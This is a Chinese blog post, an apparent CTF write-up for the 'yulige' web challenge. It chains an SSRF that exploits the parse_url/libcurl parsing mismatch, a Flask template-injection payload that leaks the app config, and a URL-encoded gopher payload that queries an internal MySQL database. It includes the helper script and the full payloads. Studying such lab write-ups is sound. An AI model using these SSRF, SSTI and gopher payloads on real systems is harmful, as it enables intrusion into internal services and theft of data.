@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html>
+  
+<head>
+  <meta charset="utf-8">
+  <meta name="author" content="Imtinmin" />
+  
+  
+  <title>ctf473831530_2019_yulige | Imtinmin的小站</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="WEB,SSRF,SSTI," />
+  
+
+  
+  <meta name="description" content="Imtinmin的小站">
+
+  
+
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.1/dist/av-min.js" async></script>
+  
+
+  
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+  
+
+  
+    <script src="//unpkg.com/valine/dist/Valine.min.js" async></script>
+  
+
+  
+
+  <script>
+  // theme-ad's config script
+  // it can be used in every script
+  
+  window.AD_CONFIG = {
+    leancloud: {"appid":"Hyq9wkH495DgNHWhDQCOfQSp-gzGzoHsz","appkey":"WaR7nrzhliHj9aVwdQzkdlGd","comment":true,"count":true},
+    welcome: {"enable":false,"interval":30},
+    start_time: "2019-10-31",
+    passwords: ["efe07af7441da2b69c4a41e42e73be4db47f66010a56900788a458354a7373ec", ],
+    is_post: true,
+    lock: false,
+    author: "Imtinmin",
+    share: {"twitter":false,"facebook":false,"weibo":false,"qq":false,"wechat":false},
+    mathjax: true,
+    page_type: "",
+    root: "/"
+  };
+</script>
+
+  <script src="/vendor/sha256.min.js"></script>
+<script src="/js/auth.js"></script>
+<script src="/js/index.js"></script>
+<script src="/vendor/qrcode.min.js"></script>
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+  <link rel="stylesheet" href="/css/index.css">
+<link rel="stylesheet" href="/styles/components/highlight/highlight.css">
+
+  
+</head>
+  <body>
+    <header class="site-header">
+  <div class="site-header-brand">
+    
+      <span class="site-header-brand-title">
+        <a href="/">Imtinmin</a>
+      </span>
+    
+    
+      <span class="site-header-brand-motto"> | 无知萌新</span>
+    
+  </div>
+  <div class="site-header-right">
+    <nav class="site-header-navigation">
+      
+        <a href="/" target="_self">首页</a>
+      
+        <a href="/archives/" target="_self">归档</a>
+      
+        <a href="/tags/" target="_self">标签</a>
+      
+        <a href="/categories/" target="_self">分类</a>
+      
+        <a href="/friends/" target="_self"></a>
+      
+        <a href="/about/" target="_self"></a>
+      
+    </nav>
+    <div class="site-header-btn">
+      
+        <a href="https://github.com/Imtinmin/" target="_blank" id="site-github">
+          <i class="fa fa-github-alt"></i>
+        </a>
+      
+      <a href="javascript:void(0);" id="site-search">
+        <i class="fa fa-search"></i>
+      </a>
+      <a href="javascript:void(0);" id="site-nav-btn">
+        <i class="fa fa-ellipsis-v"></i>
+      </a>
+    </div>
+  </div>
+</header>
+<nav class="table-content" id="site-nav">
+  <div class="table-content-title">
+    <span>导航</span>
+  </div>
+  <div class="table-content-main">
+    <ol class="toc">
+      
+        <li class="toc-item">
+          <a href="/" target="_self">
+            首页
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/archives/" target="_self">
+            归档
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/tags/" target="_self">
+            标签
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/categories/" target="_self">
+            分类
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/friends/" target="_self">
+            
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/about/" target="_self">
+            
+          </a>
+        </li>
+      
+    </ol>
+  </div>
+</nav>
+<div id="site-process"></div>
+    <main>
+      
+  <div class="passage">
+  <div class="passage-meta">
+    <span>
+      <i class="fa fa-calendar"></i>2019-12-05
+    </span>
+    
+    
+      <span>
+        | <i class="fa fa-unlock-alt"></i>UNLOCK
+      </span>
+    
+  </div>
+  <h1 class="passage-title">
+    ctf473831530_2019_yulige
+  </h1>
+  
+    <div class="passage-cover">
+      <figure style="background-image:url(https://i.loli.net/2019/12/05/wjx2tghECJsi9DS.png);"></figure>
+    </div>
+  
+  <article class="passage-article">
+    <blockquote>
+<p> 我改了一下web2 Dockerfile 不知道为啥pip连不上官方源，用清华源终于成了</p>
+</blockquote>
+<p><a href="https://github.com/Imtinmin/ctf473831530_2019_web1_yulige" target="_blank" rel="noopener">https://github.com/Imtinmin/ctf473831530_2019_web1_yulige</a></p>
+<p>给了源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span><span class="params">($url)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    $match_result=preg_match(<span class="string">'/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/'</span>,$url); </span><br><span class="line">    <span class="keyword">if</span> (!$match_result) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'url fomat error'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">try</span> </span><br><span class="line">    &#123; </span><br><span class="line">        $url_parse=parse_url($url); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'url fomat error'</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    $hostname=$url_parse[<span class="string">'host'</span>]; </span><br><span class="line">    $ip=gethostbyname($hostname); </span><br><span class="line">    $int_ip=ip2long($ip); </span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">'127.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'10.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'172.16.0.0'</span>)&gt;&gt;<span class="number">20</span> == $int_ip&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">'192.168.0.0'</span>)&gt;&gt;<span class="number">16</span> == $int_ip&gt;&gt;<span class="number">16</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span><span class="params">($url)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip($url)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> $url.<span class="string">' is inner ip'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init(); </span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url); </span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">        $output = curl_exec($ch); </span><br><span class="line">        $result_info = curl_getinfo($ch); </span><br><span class="line">        <span class="keyword">if</span> ($result_info[<span class="string">'redirect_url'</span>]) </span><br><span class="line">        &#123; </span><br><span class="line">            safe_request_url($result_info[<span class="string">'redirect_url'</span>]); </span><br><span class="line">        &#125; </span><br><span class="line">        curl_close($ch); </span><br><span class="line">        var_dump($output); </span><br><span class="line">    &#125; </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">'url'</span>]; </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($url))&#123; </span><br><span class="line">    safe_request_url($url); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>hint: flag.php</p>
+</blockquote>
+<p>要ssrf访问flag.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$url_parse=parse_url($url);</span><br></pre></td></tr></table></figure>
+
+<p> parse_url 和 libcurl 处理的差异 导致ssrf<br>参考</p>
+<p><a href="https://www.anquanke.com/post/id/86527" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86527</a></p>
+<p><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf</a></p>
+<p><img src="https://uploader.shimo.im/f/tjVc0vAix1Y6jh88.png!thumbnail" alt="图片"></p>
+<p>例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://foo@127.0.0.1@1.1.1.1</span><br></pre></td></tr></table></figure>
+
+<p>那么parse_url 会解析Host为1.1.1.1 而libcurl Host为127.0.0.1以此达到ssrf目的<br>于是</p>
+<p><img src="https://uploader.shimo.im/f/kGFNet2YZXgc2YUx.png!thumbnail" alt="图片"></p>
+<p>于是拿到内网ip范围</p>
+<blockquote>
+<p>172.11.243.0/24</p>
+</blockquote>
+<p>hint2 常见端口</p>
+<p>dict扫一遍</p>
+<p><img src="https://uploader.shimo.im/f/4y37t4B4J4ww991V.png!thumbnail" alt="图片"></p>
+<blockquote>
+<p>81有一个flask :8080<br>218 有个mysql </p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">'HINT'</span>] = os.environ.pop(<span class="string">'HINT'</span>)</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">return</span> open(__file__).read()</span><br><span class="line"><span class="meta">@app.route('/yulige/&lt;path:yulige&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">yulige</span><span class="params">(yulige)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line"><span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist])+s</span><br><span class="line"><span class="keyword">return</span> flask.render_template_string(safe_jinja(yulige))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">app.run(<span class="string">"0.0.0.0"</span>,port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>
+
+<p>参考twctf2018</p>
+<p><a href="https://ctftime.org/task/6505" target="_blank" rel="noopener">https://ctftime.org/task/6505</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://foo@172.11.243.81:8080/yulige/&#123;&#123;g.__repr__.__func__.__globals__._app_ctx_stack.top.app.config&#125;&#125;@1.1.1.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://uploader.shimo.im/f/k7YUkvfSdIMPzFsh.png!thumbnail" alt="图片"></p>
+<p>得到hint:mysql_user_is_yuligeeee123321</p>
+<p>gopher 打 mysql</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p</span><br><span class="line">create user <span class="string">'yuligeeee123321'</span>@<span class="string">'localhost'</span>;</span><br><span class="line">create database fla4441111g;</span><br><span class="line">use fla4441111g;</span><br><span class="line">grant all privileges on `*` to <span class="string">'yuligeeee123321'</span>@<span class="string">'localhost'</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i lo port 3306 -w mysql.pcap</span><br><span class="line">mysql -h 127.0.0.1 -uyuligeeee123321 -p</span><br><span class="line">use fla4441111g;select * from F1111llllggggg;</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+
+<p>用wireshark打开mysql.pcap</p>
+<p><img src="https://uploader.shimo.im/f/ph6RsOzHocAGDPWA.png!thumbnail" alt="图片"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ae00000185a6ff010000000121000000000000000000000000000000000000000000000079756c69676565656531323333323100006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f7069640532303633360f5f636c69656e745f76657273696f6e06352e372e3236095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c</span><br><span class="line">210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d69742031</span><br><span class="line">120000000353454c4543542044415441424153452829</span><br><span class="line">0c00000002666c613434343131313167</span><br><span class="line">0f0000000373686f7720646174616261736573</span><br><span class="line">0c0000000373686f77207461626c6573</span><br><span class="line">100000000446313131316c6c6c6c676767676700</span><br><span class="line">1d0000000373656c656374202a2066726f6d2046313131316c6c6c6c6767676767</span><br><span class="line">0100000001</span><br></pre></td></tr></table></figure>
+
+<p>换到一行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">results</span><span class="params">(s)</span>:</span></span><br><span class="line">    a=[s[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,len(s),<span class="number">2</span>)]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"curl gopher://172.11.243.218:3306/_%"</span>+<span class="string">"%"</span>.join(a)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line">    s=sys.argv[<span class="number">1</span>]</span><br><span class="line">    print(results(s))</span><br></pre></td></tr></table></figure>
+
+<p>用这个脚本转成payload，打过去，false……what?<br>url编码一下</p>
+<p>最终payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=gopher://172.11.243.218:3306/%5f%25%61%65%25%30%30%25%30%30%25%30%31%25%38%35%25%61%36%25%66%66%25%30%31%25%30%30%25%30%30%25%30%30%25%30%31%25%32%31%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%37%39%25%37%35%25%36%63%25%36%39%25%36%37%25%36%35%25%36%35%25%36%35%25%36%35%25%33%31%25%33%32%25%33%33%25%33%33%25%33%32%25%33%31%25%30%30%25%30%30%25%36%64%25%37%39%25%37%33%25%37%31%25%36%63%25%35%66%25%36%65%25%36%31%25%37%34%25%36%39%25%37%36%25%36%35%25%35%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%66%25%37%32%25%36%34%25%30%30%25%36%36%25%30%33%25%35%66%25%36%66%25%37%33%25%30%35%25%34%63%25%36%39%25%36%65%25%37%35%25%37%38%25%30%63%25%35%66%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%35%66%25%36%65%25%36%31%25%36%64%25%36%35%25%30%38%25%36%63%25%36%39%25%36%32%25%36%64%25%37%39%25%37%33%25%37%31%25%36%63%25%30%34%25%35%66%25%37%30%25%36%39%25%36%34%25%30%35%25%33%32%25%33%30%25%33%36%25%33%33%25%33%36%25%30%66%25%35%66%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%35%66%25%37%36%25%36%35%25%37%32%25%37%33%25%36%39%25%36%66%25%36%65%25%30%36%25%33%35%25%32%65%25%33%37%25%32%65%25%33%32%25%33%36%25%30%39%25%35%66%25%37%30%25%36%63%25%36%31%25%37%34%25%36%36%25%36%66%25%37%32%25%36%64%25%30%36%25%37%38%25%33%38%25%33%36%25%35%66%25%33%36%25%33%34%25%30%63%25%37%30%25%37%32%25%36%66%25%36%37%25%37%32%25%36%31%25%36%64%25%35%66%25%36%65%25%36%31%25%36%64%25%36%35%25%30%35%25%36%64%25%37%39%25%37%33%25%37%31%25%36%63%25%32%31%25%30%30%25%30%30%25%30%30%25%30%33%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%34%30%25%34%30%25%37%36%25%36%35%25%37%32%25%37%33%25%36%39%25%36%66%25%36%65%25%35%66%25%36%33%25%36%66%25%36%64%25%36%64%25%36%35%25%36%65%25%37%34%25%32%30%25%36%63%25%36%39%25%36%64%25%36%39%25%37%34%25%32%30%25%33%31%25%31%32%25%30%30%25%30%30%25%30%30%25%30%33%25%35%33%25%34%35%25%34%63%25%34%35%25%34%33%25%35%34%25%32%30%25%34%34%25%34%31%25%35%34%25%34%31%25%34%32%25%34%31%25%35%33%25%34%35%25%32%38%25%32%39%25%30%63%25%30%30%25%30%30%25%30%30%25%30%32%25%36%36%25%36%63%25%36%31%25%33%34%25%33%34%25%33%34%25%33%31%25%33%31%25%33%31%25%33%31%25%36%37%25%30%66%25%30%30%25%30%30%25%30%30%25%30%33%25%37%33%25%36%38%25%36%66%25%37%37%25%32%30%25%36%34%25%36%31%25%37%34%25%36%31%25%36%32%25%36%31%25%37%33%25%36%35%25%37%33%25%30%63%25%30%30%25%30%30%25%30%30%25%30%33%25%37%33%25%36%38%25%36%66%25%37%37%25%32%30%25%37%34%25%36%31%25%36%32%25%36%63%25%36%35%25%37%33%25%31%30%25%30%30%25%30%30%25%30%30%25%30%34%25%34%36%25%33%31%25%33%31%25%33%31%25%33%31%25%36%63%25%36%63%25%36%63%25%36%63%25%36%37%25%36%37%25%36%37%25%36%37%25%36%37%25%30%30%25%31%64%25%30%30%25%30%30%25%30%30%25%30%33%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%32%61%25%32%30%25%36%36%25%37%32%25%36%66%25%36%64%25%32%30%25%34%36%25%33%31%25%33%31%25%33%31%25%33%31%25%36%63%25%36%63%25%36%63%25%36%63%25%36%37%25%36%37%25%36%37%25%36%37%25%36%37%25%30%31%25%30%30%25%30%30%25%30%30%25%30%31</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://uploader.shimo.im/f/iUdi0WMbafcyg3BA.png!thumbnail" alt="图片"></p>
+<p>是道好题，ylg!ylg!</p>
+
+  </article>
+  <aside class="table-content" id="site-toc">
+  <div class="table-content-title">
+    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
+    <span>目录</span>
+  </div>
+  <div class="table-content-main">
+    
+  </div>
+</aside>
+  
+  
+    <div class="passage-tags">
+     
+      <a href="/tags/WEB/"><i class="fa fa-tags"></i>WEB</a>
+     
+      <a href="/tags/SSRF/"><i class="fa fa-tags"></i>SSRF</a>
+     
+      <a href="/tags/SSTI/"><i class="fa fa-tags"></i>SSTI</a>
+    
+    </div>
+  
+</div>
+
+    </main>
+    
+      
+<div class="site-comment-contanier" data-plateform="leancloud">
+  
+    <p id="site-comment-info">
+      <i class="fa fa-spinner fa-spin"></i> 评论加载中
+    </p>
+    <div id="site-comment"></div>
+  
+</div>
+    
+    <div class="site-footer-wrapper">
+  <footer class="site-footer">
+    
+      
+        <div class="site-footer-col">
+          <h5 class="site-footer-title"></h5>
+          
+            <span class="site-footer-item">
+              <a href="https://godbmw.com/" target="_blank"></a>
+            </span>
+          
+            <span class="site-footer-item">
+              <a href="http://ruanyifeng.com/" target="_blank"></a>
+            </span>
+          
+        </div>
+      
+        <div class="site-footer-col">
+          <h5 class="site-footer-title"></h5>
+          
+            <span class="site-footer-item">
+              <a href="https://godbmw.com/categories/webpack4%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B/" target="_blank"></a>
+            </span>
+          
+            <span class="site-footer-item">
+              <a href="https://godbmw.com/design-patterns/" target="_blank"></a>
+            </span>
+          
+        </div>
+      
+        <div class="site-footer-col">
+          <h5 class="site-footer-title"></h5>
+          
+            <span class="site-footer-item">
+              <a href="https://juejin.im/user/5b91fcf06fb9a05d3c7fd4a5" target="_blank"></a>
+            </span>
+          
+            <span class="site-footer-item">
+              <a href="https://segmentfault.com/" target="_blank"></a>
+            </span>
+          
+        </div>
+      
+    
+    <div class="site-footer-info">
+      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
+    </div>
+    
+      <div class="site-footer-info">
+        <i class="fa fa-paw"></i> 您是本站第 <span id="site-count"></span> 位访客
+      </div>
+    
+    
+      <div class="site-footer-info">
+        <i class="fa fa-at"></i> Email: 954093370@qq.com
+      </div>
+    
+    <div class="site-footer-info">
+      <i class="fa fa-copyright"></i> 
+      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
+      Created by <a href="https://godbmw.com/" target="_blank">GodBMW</a>.
+      All rights reserved.
+    </div>
+  </footer>
+</div>
+    <div id="site-layer" style="display:none;">
+  <div class="site-layer-content">
+    <div class="site-layer-header">
+      <span class="site-layer-header-title" id="site-layer-title"></span>
+      <i class="fa fa-close" id="site-layer-close"></i>
+    </div>
+    <div class="site-layer-body" id="site-layer-container">
+      <div class="site-layer-input" id="site-layer-search" style="display: none;">
+        <div class="site-layer-input-choose">
+          <a href="javascript:void(0);" title="Change Search Engine">Google</a>
+        </div>
+        <input type="text">
+        <i class="fa fa-search"></i>
+      </div>
+      
+        <div class="site-layer-reward" id="site-layer-reward" style="display: none;">
+          
+            <div>
+              <img src="/images/wechat.jpg" alt="WeChat">
+              
+                <p>WeChat</p>
+              
+            </div>
+          
+            <div>
+              <img src="/images/alipay.png" alt="AliPay">
+              
+                <p>AliPay</p>
+              
+            </div>
+          
+        </div>
+      
+      <div id="site-layer-welcome" style="display:none;"></div>
+    </div>
+  </div>
+</div>
+    
+
+<div class="bottom-bar">
+  <div class="bottom-bar-left">
+    <a href="javascript:void(0);" data-enable="false">
+      <i class="fa fa-arrow-left"></i>
+    </a>
+    <a href="/2019/12/01/2019-12-1-WEB/" data-enable="true">
+      <i class="fa fa-arrow-right"></i>
+    </a>
+  </div>
+  <div class="bottom-bar-right">
+    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
+      <i class="fa fa-bars"></i>
+    </a>
+    
+      <a href="#site-comment" data-enable="true">
+        <i class="fa fa-commenting"></i>
+      </a>
+    
+    <a href="javascript:void(0);" id="site-toggle-share-btn">
+      <i class="fa fa-share-alt"></i>
+    </a>
+    
+      <a href="javascript:void(0);" id="site-reward">
+        <i class="fa fa-thumbs-up"></i>
+      </a>
+    
+    <a href="javascript:void(0);" id="back-top-btn">
+      <i class="fa fa-chevron-up"></i>
+    </a>
+  </div>
+</div>
+    <div id="share-btn">
+  
+  
+  
+  
+  
+</div>
+    
+
+
+
+
+
+    
+  </body>
+</html>
